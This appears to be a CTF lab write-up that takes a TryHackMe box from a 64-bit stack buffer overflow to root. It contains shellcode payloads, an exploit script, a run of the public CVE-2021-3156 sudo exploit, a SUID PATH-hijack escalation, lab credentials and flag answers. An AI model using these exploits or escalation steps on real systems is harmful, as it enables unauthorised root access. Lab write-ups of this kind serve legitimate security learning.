r < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "BBBBCCCC")')

return address into the middle of our NOP sled

0x7fffffffe37c --> \x7c\xe3\xff\xff\xff\x7f\x00\x00

r < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')


(gdb) r < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/des/bof < <(python -c 'print("\x90" * (616 - 27) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
Enter some string:

Program received signal SIGILL, Illegal instruction.
0x00007fffffffe492 in ?? ()
(gdb) i r
rax            0x0	0
rbx            0x68732f6e69622f	29400045130965551
rcx            0x0	0
rdx            0x0	0
rsi            0x555555554956	93824992233814
rdi            0x7ffff7dd0760	140737351845728
rbp            0x50f3bb05e545752	0x50f3bb05e545752
rsp            0x7fffffffe490	0x7fffffffe490
r8             0xffffffffffffffed	-19
r9             0x25e	606
r10            0x5555557564cb	93824994337995
r11            0x555555554956	93824992233814
r12            0x3e9	1001
r13            0x7fffffffe590	140737488348560
r14            0x0	0
r15            0x0	0
rip            0x7fffffffe492	0x7fffffffe492
eflags         0x10213	[ CF AF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/xg $rsp
0x7fffffffe490:	0x00007ffff7dd0760
(gdb) x/xb 0x7fffffffe467
0x7fffffffe467:	0x90

finally

r < <(python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')

(gdb) r < <(python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/des/bof < <(python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")')
Enter some string:
process 1409 is executing new program: /bin/dash
[Inferior 1 (process 1409) exited normally]

des@THM_exploit:~$ (python -c 'print("\x90" * (616 - 27 - 100) + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 100 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")';cat)|./bof
Enter some string:
whoami
kel
cd /home/kel
ls
exe  exe.c  flag.txt
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265
cat exe.c
#include <unistd.h>

void main()
{
	setuid(0);
	setgid(0);
	system("ps");
}

another way

┌──(kali㉿kali)-[~/binex]
└─$ python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05")
24

┌──(kali㉿kali)-[~/binex]
└─$ python2 exploit.py       
����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������PH1�H1�H�/bin//shST_�;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB|����
                                                                                                          
┌──(kali㉿kali)-[~/binex]
└─$ cat exploit.py 
from struct import pack
buf="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" #24
payload="\x90"*400 
payload += buf #424
payload += "A" * (208 -len(buf)) #184
payload +="B" *8 #616
payload += pack("<Q", 0x7fffffffe37c) #middle
print payload

┌──(kali㉿kali)-[~/binex]
└─$ python3 -m http.server 8000                                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.26.113 - - [19/Jan/2023 22:48:53] "GET /exploit.py HTTP/1.1" 200 -

des@THM_exploit:~$ wget http://10.8.19.103:8000/exploit.py
--2023-01-20 03:48:53--  http://10.8.19.103:8000/exploit.py
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 292 [text/x-python]
Saving to: ‘exploit.py’

exploit.py           100%[====================>]     292  --.-KB/s    in 0s      

2023-01-20 03:48:53 (25.1 MB/s) - ‘exploit.py’ saved [292/292]

des@THM_exploit:~$ chmod 777 exploit.py
des@THM_exploit:~$ python exploit.py > binex
des@THM_exploit:~$ (cat binex; cat) | ./bof
Enter some string:
whoami
kel
cd /home/kel
ls
exe  exe.c  flag.txt
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265


trying baron edit

https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)


des@THM_exploit:~$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): memory corruption
Aborted (core dumped)

┌──(kali㉿kali)-[~/binex]
└─$ wget https://github.com/blasty/CVE-2021-3156/archive/main.zip

--2023-01-19 21:36:35--  https://github.com/blasty/CVE-2021-3156/archive/main.zip
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://codeload.github.com/blasty/CVE-2021-3156/zip/refs/heads/main [following]
--2023-01-19 21:36:36--  https://codeload.github.com/blasty/CVE-2021-3156/zip/refs/heads/main
Resolving codeload.github.com (codeload.github.com)... 140.82.112.10
Connecting to codeload.github.com (codeload.github.com)|140.82.112.10|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/zip]
Saving to: ‘main.zip’

main.zip                       [ <=>                                   ]   4.22K  --.-KB/s    in 0s      

2023-01-19 21:36:36 (8.55 MB/s) - ‘main.zip’ saved [4321]

                                                                                                          
┌──(kali㉿kali)-[~/binex]
└─$ ls
bof  bof64.c  exploit.py  main.zip  test
                                                                                                          
┌──(kali㉿kali)-[~/binex]
└─$ unzip main.zip

Archive:  main.zip
da68f7c1a2961595a3226b903f1fc180b8824255
   creating: CVE-2021-3156-main/
  inflating: CVE-2021-3156-main/Makefile  
  inflating: CVE-2021-3156-main/README.md  
  inflating: CVE-2021-3156-main/brute.sh  
  inflating: CVE-2021-3156-main/hax.c  
  inflating: CVE-2021-3156-main/lib.c  
                                                                                                          
┌──(kali㉿kali)-[~/binex]
└─$ ls
bof  bof64.c  CVE-2021-3156-main  exploit.py  main.zip  test
                                                                                                          
┌──(kali㉿kali)-[~/binex]
└─$ cd CVE-2021-3156-main               
                                                                                                          
┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
└─$ ls
brute.sh  hax.c  lib.c  Makefile  README.md
                                                                                                          
┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
└─$ make               
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
                                                                                                          
┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
└─$ ls
brute.sh  hax.c  lib.c  libnss_X  Makefile  README.md  sudo-hax-me-a-sandwich

┌──(kali㉿kali)-[~/binex/CVE-2021-3156-main]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.107.36 - - [19/Jan/2023 21:57:46] "GET /hax.c HTTP/1.1" 200 -

des@THM_exploit:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic

des@THM_exploit:/tmp$ wget http://10.8.19.103:8000/hax.c
--2023-01-20 03:03:43--  http://10.8.19.103:8000/hax.c
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4420 (4.3K) [text/x-csrc]
Saving to: ‘hax.c’

hax.c                100%[====================>]   4.32K  --.-KB/s    in 0.001s  

2023-01-20 03:03:43 (3.93 MB/s) - ‘hax.c’ saved [4420/4420]

des@THM_exploit:/tmp$ gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
des@THM_exploit:/tmp$ 
des@THM_exploit:/tmp$ chmod +x sudo-hax-me-a-sandwich
es@THM_exploit:/tmp$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[sudo] password for des: 
des is not in the sudoers file.  This incident will be reported.

```


**[+50 Points]** What is the contents of /home/kel/flag.txt?

*THM{buffer_overflow_in_64_bit}*

### PATH Manipulation :: Binary 3

Get the root flag from the root directory. This will require you to understand how the PATH variable works.  

Answer the questions below

```
kel:kelvin_74656d7065726174757265

┌──(kali㉿kali)-[~/Downloads]
└─$ ssh kel@10.10.26.113
kel@10.10.26.113's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 20 03:51:22 UTC 2023

  System load:  0.0                Processes:           92
  Usage of /:   22.0% of 19.56GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.26.113
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

59 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan 17 13:33:55 2020 from 192.168.247.130
kel@THM_exploit:~$ ls
exe  exe.c  flag.txt
kel@THM_exploit:~$ cat exe.c
#include <unistd.h>

void main()
{
	setuid(0);
	setgid(0);
	system("ps");
}

kel@THM_exploit:~$ ./exe
  PID TTY          TIME CMD
 1559 pts/0    00:00:00 exe
 1560 pts/0    00:00:00 sh
 1561 pts/0    00:00:00 ps

kel@THM_exploit:~$ cp /bin/sh /tmp/ps
kel@THM_exploit:~$ cd /tmp
kel@THM_exploit:/tmp$ ls
ps
systemd-private-9c5ca549763e4dc08ac1049864de27ef-systemd-resolved.service-KG4AUS
systemd-private-9c5ca549763e4dc08ac1049864de27ef-systemd-timesyncd.service-xZk819

kel@THM_exploit:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kel@THM_exploit:/tmp$ export PATH=/tmp:$PATH
kel@THM_exploit:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kel@THM_exploit:/tmp$ cd /home/kel
kel@THM_exploit:~$ ls
exe  exe.c  flag.txt
kel@THM_exploit:~$ ./exe
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
The flag: THM{SUID_binary_and_PATH_exploit}. 
Also, thank you for your participation.

The room is built with love. DesKel out.


# gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
# chmod +x sudo-hax-me-a-sandwich
# ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

# ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
Error opening terminal: unknown.
sudoedit: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ unchanged
sudoedit: \ unchanged
sudoedit: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\ unchanged


```

**[+250 Points]** What is the contents of /root/root.txt?

The true path leads you to the flag.

*THM{SUID_binary_and_PATH_exploit}*


[[Jack]]